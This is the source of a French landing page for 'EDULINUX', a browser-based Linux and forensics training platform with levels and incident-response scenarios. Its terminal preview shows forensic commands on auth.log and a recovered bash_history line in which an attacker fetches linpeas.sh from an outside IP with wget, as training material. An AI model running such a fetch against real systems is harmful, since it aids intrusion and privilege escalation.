import Link from 'next/link';

const TRACKS = [
  { range: '01–10', title: 'Terminal & SSH',      items: ['ls, cd, pwd, cat', 'grep, find', 'chmod, base64', 'SSH'],              accent: '#a3e635' },
  { range: '11–20', title: 'Flux & Scripts',      items: ['>, >>, |', 'wc, sort, uniq', 'Variables, wildcards', 'Scripts Bash'], accent: '#a3e635' },
  { range: '21–30', title: 'Sécurité',            items: ['sudo, SUID', 'Clés SSH', 'Hashing, sed, regex', 'CTF finale'],        accent: '#a3e635' },
  { range: '31–40', title: 'Système Linux',       items: ['df, du, free, top', 'journalctl, systemctl', 'crontab, umask', 'Utilisateurs'],  accent: '#a3e635' },
  { range: '41–50', title: 'Réseau',              items: ['ip, ss, dig', 'ping, traceroute', 'iptables, rsync', 'Tunnel SSH'],    accent: '#a3e635' },
  { range: '51–60', title: 'Forensic Linux',      items: ['auth.log, stat', 'Timeline, lsof', 'Hash, persistance', 'Réponse IR'], accent: '#a3e635' },
];

export default function Home() {
  return (
    <div className="min-h-screen bg-[#0a0e17] text-white font-mono">

      {/* Nav */}
      <nav className="border-b border-white/5 px-6 md:px-16 py-4 flex items-center justify-between">
        <span className="text-[#a3e635] font-bold tracking-widest text-sm">EDULINUX</span>
        <div className="flex items-center gap-6 text-sm text-gray-500">
          <Link href="/levels" className="hover:text-white transition-colors">niveaux</Link>
          <Link href="/scenarios" className="hover:text-white transition-colors">scénarios</Link>
          <Link href="/levels" className="border border-[#a3e635]/50 text-[#a3e635] hover:bg-[#a3e635] hover:text-black px-4 py-1.5 rounded transition-all font-bold">
            démarrer
          </Link>
        </div>
      </nav>

      {/* Hero */}
      <section className="max-w-5xl mx-auto px-6 md:px-16 pt-24 pb-20">
        <p className="text-[#a3e635] text-xs tracking-[0.3em] uppercase mb-6">Plateforme d&apos;entraînement Linux</p>
        <h1 className="text-5xl md:text-7xl font-bold leading-tight mb-6 text-white tracking-tight">
          Apprends Linux<br />
          <span className="text-gray-500">comme un</span> professionnel
        </h1>
        <p className="text-gray-400 text-lg max-w-xl mb-10 leading-relaxed">
          60 niveaux progressifs — terminal, système, réseau, forensic. Tout dans le navigateur, simulateur fidèle, pas de compte requis.
        </p>

        <div className="flex items-center gap-4 mb-20">
          <Link
            href="/levels"
            className="bg-[#a3e635] text-black font-bold px-6 py-3 rounded text-sm hover:bg-[#bef264] transition-colors"
          >
            Commencer — Niveau 01
          </Link>
          <Link
            href="/scenarios"
            className="border border-white/10 text-gray-400 hover:text-white hover:border-white/30 px-6 py-3 rounded text-sm transition-colors"
          >
            Voir les scénarios
          </Link>
        </div>

        {/* Stats row */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-px bg-white/5 rounded overflow-hidden">
          {[
            { v: '60',   l: 'niveaux' },
            { v: '3',    l: 'scénarios IR' },
            { v: '40+',  l: 'commandes' },
            { v: '0',    l: 'installation' },
          ].map(s => (
            <div key={s.l} className="bg-[#0a0e17] px-6 py-5 text-center">
              <div className="text-[#a3e635] font-bold text-2xl">{s.v}</div>
              <div className="text-gray-600 text-xs mt-1">{s.l}</div>
            </div>
          ))}
        </div>
      </section>

      {/* Parcours */}
      <section className="max-w-5xl mx-auto px-6 md:px-16 pb-20">
        <p className="text-gray-600 text-xs tracking-[0.3em] uppercase mb-2">Parcours</p>
        <h2 className="text-2xl font-bold text-white mb-8">6 chapitres, des bases au forensic</h2>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-px bg-white/5 rounded overflow-hidden">
          {TRACKS.map((t) => (
            <div key={t.range} className="bg-[#0a0e17] p-6 hover:bg-[#0f1520] transition-colors">
              <div className="flex items-baseline gap-3 mb-3">
                <span className="text-[#a3e635] text-xs font-bold tracking-widest">{t.range}</span>
                <span className="w-px h-3 bg-white/10" />
                <span className="text-white font-bold text-sm">{t.title}</span>
              </div>
              <ul className="space-y-1.5">
                {t.items.map(item => (
                  <li key={item} className="text-gray-500 text-xs flex items-center gap-2">
                    <span className="text-[#a3e635]/50">›</span>
                    {item}
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
      </section>

      {/* Scenarios */}
      <section className="max-w-5xl mx-auto px-6 md:px-16 pb-20">
        <div className="border border-white/8 rounded p-8 md:p-12">
          <div className="grid md:grid-cols-2 gap-10 items-start">
            <div>
              <p className="text-[#a3e635] text-xs tracking-[0.3em] uppercase mb-3">Mode avancé</p>
              <h2 className="text-2xl font-bold text-white mb-4">Scénarios de mise en situation</h2>
              <p className="text-gray-500 text-sm leading-relaxed mb-6">
                Une fois les bases acquises, affronte des incidents réalistes : brute-force SSH, webshell, cartographie réseau.
                Pas de commande unique — il faut raisonner et enchaîner.
              </p>
              <ul className="space-y-2 text-sm text-gray-500 mb-8">
                {['Contexte détaillé fourni', 'Forensic, réseau, système', 'Validation par jalons', 'Badges et XP'].map(i => (
                  <li key={i} className="flex items-center gap-2"><span className="text-[#a3e635]">✓</span>{i}</li>
                ))}
              </ul>
              <Link
                href="/scenarios"
                className="border border-[#a3e635]/40 text-[#a3e635] hover:bg-[#a3e635] hover:text-black px-5 py-2.5 rounded text-sm font-bold transition-all inline-block"
              >
                Voir les scénarios →
              </Link>
            </div>

            {/* Terminal preview */}
            <div className="bg-black rounded border border-white/8 overflow-hidden">
              <div className="bg-[#111827] px-4 py-2.5 flex items-center gap-2 border-b border-white/5">
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="w-2.5 h-2.5 rounded-full bg-white/10" />
                <span className="text-gray-600 text-xs ml-2">forensic@edulinux:~$</span>
              </div>
              <div className="p-5 text-xs space-y-2 leading-relaxed">
                <div><span className="text-[#a3e635]">$</span> <span className="text-white">grep &apos;Failed&apos; auth.log | wc -l</span></div>
                <div className="text-gray-400">847</div>
                <div className="mt-2"><span className="text-[#a3e635]">$</span> <span className="text-white">grep &apos;Accepted&apos; auth.log</span></div>
                <div className="text-gray-400">Accepted password for <span className="text-white">admin</span> from <span className="text-red-400">185.220.101.5</span></div>
                <div className="mt-2"><span className="text-[#a3e635]">$</span> <span className="text-white">cat bash_history | grep wget</span></div>
                <div className="text-red-400">wget http://185.220.101.5/tools/linpeas.sh</div>
                <div className="mt-2 text-[#a3e635]">✓ Étape validée — connexion confirmée</div>
                <div className="text-gray-600 animate-pulse">█</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-white/5 px-6 md:px-16 py-6 flex items-center justify-between">
        <span className="text-[#a3e635] font-bold text-xs tracking-widest">EDULINUX</span>
        <div className="flex gap-6 text-gray-600 text-xs">
          <Link href="/levels" className="hover:text-white transition-colors">niveaux</Link>
          <Link href="/scenarios" className="hover:text-white transition-colors">scénarios</Link>
        </div>
        <span className="text-gray-700 text-xs">Duolingo × OverTheWire Bandit</span>
      </footer>
    </div>
  );
}
